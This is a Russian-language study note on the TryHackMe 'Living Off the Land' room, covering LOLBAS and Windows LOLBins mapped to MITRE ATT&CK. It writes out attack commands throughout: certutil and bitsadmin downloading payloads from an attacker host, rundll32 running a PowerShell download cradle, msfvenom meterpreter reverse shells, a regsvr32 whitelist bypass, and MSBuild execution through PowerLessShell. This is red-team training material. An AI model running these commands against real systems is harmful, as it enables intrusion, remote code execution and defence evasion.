```http
https://tryhackme.com/room/livingofftheland
```
# Windows Sysinternals
Windows Sysinternals — это набор инструментов и расширенных системных утилит, разработанных для помощи ИТ-специалистам в управлении, устранении неполадок и диагностике операционной системы Windows по различным сложным темам. 

```
\\live.sysinternals.com\tools
```
___
___
# LOLBAS
Основная цель проекта — собрать и задокументировать подписанные Microsoft и встроенные инструменты, используемые в качестве методов жизни вне Земли, включая двоичные файлы, скрипты и библиотеки.

```
https://lolbas-project.github.io/
```

Для того чтобы инструмент считался техникой «Жизни за счет земли» и был принят в рамках проекта LOLBAS, необходимы определенные критерии:  

- Подписанный Microsoft файл, встроенный в ОС или загруженный с сайта Microsoft.  
- Наличие дополнительных интересных непреднамеренных функций, не охваченных известными вариантами использования.  
- Приносит пользу APT (Advanced Persistent Threat) или действиям Red Team.

Веб-сайт LOLBAS предоставляет удобную строку поиска для запроса всех доступных данных. Искать двоичный файл просто; включение имени двоичного файла покажет результат. Однако, если мы хотим найти конкретную функцию, нам необходимо указать  / перед именем функции. Например, если мы ищем все функции выполнения, нам следует использовать  /execute .  Аналогично, чтобы искать на основе типов, нам следует использовать  символ # , за которым следует имя типа.  Ниже приведены типы, включенные в проект:
- Script
- Binary
- Libraries
- OtherMSBinaries
___
___
# File Operations
### Certutil

```cmd
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
```

Также  certutil.exe  можно использовать в качестве инструмента кодирования, с помощью которого мы можем кодировать файлы и декодировать их содержимое.  ATT&CK  [T1027](https://attack.mitre.org/techniques/T1027/) ссылается на эту технику для запутывания файлов, чтобы затруднить их обнаружение или анализ.
```cmd
certutil -encode payload.exe Encoded-payload.txt
```
___
### BITSAdmin

```cmd
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```
___
### FindStr
Загрузка удаленных файлов из общих папок SMB
```cmd
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```
___
___
# File Execution
Основанный на фреймворке MITRE ATT&CK, этот метод называется  **Signed Binary Proxy Execution**  или  **Indirect Command Execution (косвенное выполнение команды)** , при котором злоумышленник использует другие системные инструменты для запуска вредоносной полезной нагрузки. Этот метод также помогает обойти средства защиты.
___
### File Explorer
- C:\Windows\explorer.exe для 64-разрядной версии Windows.
- C:\Windows\SysWOW64\explorer.exe для 32-разрядной версии Windows.

```
explorer.exe /root,"C:\Windows\System32\calc.exe"
```
___
### WMIC
Инструментарий управления Windows (WMIC) — это утилита командной строки Windows, которая управляет компонентами Windows. Обнаружено, что WMIC также используется для запуска двоичных файлов с целью обхода защитных мер.  В фреймворке MITRE ATT&CK  этот метод называется Signed Binary Proxy Execution ( [T1218](https://attack.mitre.org/techniques/T1218/) )

```powershell
wmic.exe process call create calc
```
___
### Rundll32
Rundll32 — это  встроенный инструмент  Microsoft , который загружает и запускает DLL -файлы динамической библиотеки в операционной системе. Команда, находящаяся под угрозой, может использовать  rundll32.exe для запуска произвольных полезных нагрузок и выполнения скриптов JavaScript и PowerShell. Фреймворк MITRE ATT &  CK идентифицирует это как  **Signed Binary** **Proxy** **Execution: Rundll32** и обозначает это как [T1218](https://attack.mitre.org/techniques/T1218/011/) .

```powershell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

 Следующая команда запускает JavaScript-код, который выполняет скрипт PowerShell для загрузки данных с удалённого веб-сайта с помощью  rundll32.exe .
```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```
___
___
# Обход белого списка приложений
Белый список приложений — это функция безопасности конечных точек Microsoft, которая предотвращает запуск вредоносных и несанкционированных программ в режиме реального времени. Белый список приложений основан на правилах, которые определяют список одобренных приложений или исполняемых файлов, разрешённых к использованию и запуску в операционной системе. В  этой задаче рассматриваются примеры LOLBAS, используемые для обхода белого списка приложений Windows.
___
### Regsvr32
Regsvr32 — это утилита командной строки Microsoft для регистрации и отмены регистрации динамически подключаемых библиотек (DLL) в реестре Windows.  Двоичный файл regsvr.exe находится по адресу:

```powershell
C:\Windows\System32\regsvr32.exe для 32-битной версии Windows
C:\Windows\SysWOW64\regsvr32.exe для 64-битной версии Windows
```

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll

C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
ИЛИ
C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
```
___
### Bourne Again Shell (Bash)
В 2016 году Microsoft добавила поддержку среды Linux в Windows 10, 11 и Server 2019. Эта функция известна как подсистема Windows для Linux ( [WSL](https://docs.microsoft.com/en-us/windows/wsl/about) ) и существует в [двух версиях WSL](https://docs.microsoft.com/en-us/windows/wsl/compare-versions) : WSL1 и WSL2. WSL — это виртуализированный дистрибутив Linux на базе Hyper-V , работающий в операционной системе и поддерживающий подмножество ядра Linux и системных вызовов.

```powershell
bash.exe -c "path-to-payload"
```
___
___
# Другие техники
# Ярлыки
Команда Red часто использует этот метод для получения начального доступа, повышения привилегий или сохранения.В фреймворке MITRE ATT&CK этот **метод модификации ярлыка**  называется [T1547](https://attack.mitre.org/techniques/T1547/009/) , при котором злоумышленник создаёт или изменяет ярлык, чтобы воспользоваться этим методом.
```http
https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md
```
___
### Никакого PowerShell !
PowerLessShell — это инструмент на основе Python, который генерирует вредоносный код для запуска на целевой машине без отображения экземпляра процесса PowerShell . PowerLessShell использует Microsoft Build Engine (MSBuild), платформу для сборки приложений Windows, для удалённого выполнения кода.

```http
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
```

```powershell
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1

msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"

python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj

c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```
